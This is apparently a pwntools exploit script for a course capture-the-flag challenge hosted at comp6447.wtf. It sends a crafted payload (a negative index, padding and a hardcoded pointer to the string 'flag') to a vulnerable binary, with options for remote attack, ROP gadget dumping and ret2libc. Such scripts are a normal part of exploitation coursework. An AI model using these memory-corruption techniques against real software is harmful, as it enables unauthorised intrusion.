#!/usr/bin/python3

# Switches
from re import S
import sys
import argparse

# pretty print
import pprint
from colorama import Fore, Style
pp = pprint.PrettyPrinter(indent=4)

# pwn
from pwn import *
from pwnlib.rop import gadgets


# ::::::::::::::::::::::::: CONFIG :::::::::::::::::::::::::
PATH = 'Chals'
BINARY = '_binary_'
HOST = 'comp6447.wtf:_port_'

LIBC_REMOTE = f'{PATH}/libc/libc-2.23.so'
LIBC_LOCAL = '/usr/lib/i386-linux-gnu/libc-2.33.so'
# :::::::::::::::::::::::::::::::::::::::::::::::::::::::::

# ::::::::::::::::::::::: CHECK SEC ::::::::::::::::::::::::

'''

'''

# ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


def pwn(args):
    """ hack the program """
    binary = f'./{PATH}/{BINARY}'
    proc = process(binary)
    rop = ROP(binary)
    elf = ELF(binary, False)
    libc = ELF(LIBC_LOCAL, checksec=False)

    if (args.remote):
        host = HOST.split(':')
        proc = remote(host[0], int(host[1]))
        try: libc = ELF(LIBC_REMOTE, checksec=False)
        except: libc = None
    if (args.debug): gdb.attach(proc)
    if (args.gadgets):
        gadgets = rop.gadgets
        pp.pprint(gadgets)
    if (args.ret2libc): rop = ROP(libc)


    ## get da banner
    log.info('Receiving banner ...')

    target_file = b'flag'          

    payload = b'-15'                          
    # 9 - 4
    pad_to_file = b'P' * 5
    payload += pad_to_file                  
    payload += p32(-15, sign=True)
    
    
    # >-> ptr to str here <-<
    #              buffer base
    payload += p32(0x804c060 + 9 + 7)           # p32(-15 + 4, sign=True)          # -15
    
    # we now point at the current buf
    # position so place file name
    payload += target_file                      # we need a pointer to the string

    log.info(f"payload :: {payload}")

    proc.sendline(payload)                      # send payload to img buf
    proc.interactive()

    # shellit
    proc.interactive()







def print_banner():
    print(Fore.GREEN + '''
  __                              
  \ \   _ ____      ___ __       
   \ \ | '_ \ \ /\ / / '_ \       
   / / | |_) \ V  V /| | | |     
  /_/  | .__/ \_/\_/ |_| |_|     
       |_|                       
                              
    ''')
    print(Style.RESET_ALL)


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description=print_banner(), 
        epilog='>> happy pwning'
    )

    parser.add_argument('-l', '--local',
                        help = 'run against local binary, default',
                        action = 'store_true',
                        )
    parser.add_argument('-d', '--debug',
                        help = 'run with debugger attached',
                        action ='store_true'
                        )
    parser.add_argument('-r', '--remote',
                        help = 'run against remote binary',
                        action ='store_true'
                        )
    parser.add_argument('-g', '--gadgets',
                        help = 'dump binary gadgets',
                        action ='store_true'
                        )
    parser.add_argument('-libc', '--ret2libc',
                        help = 'configure rop for ret2libc',
                        action ='store_true'
                        )

    args = parser.parse_args()

    if (len(sys.argv) == 1): parser.print_help()
    else: pwn(args)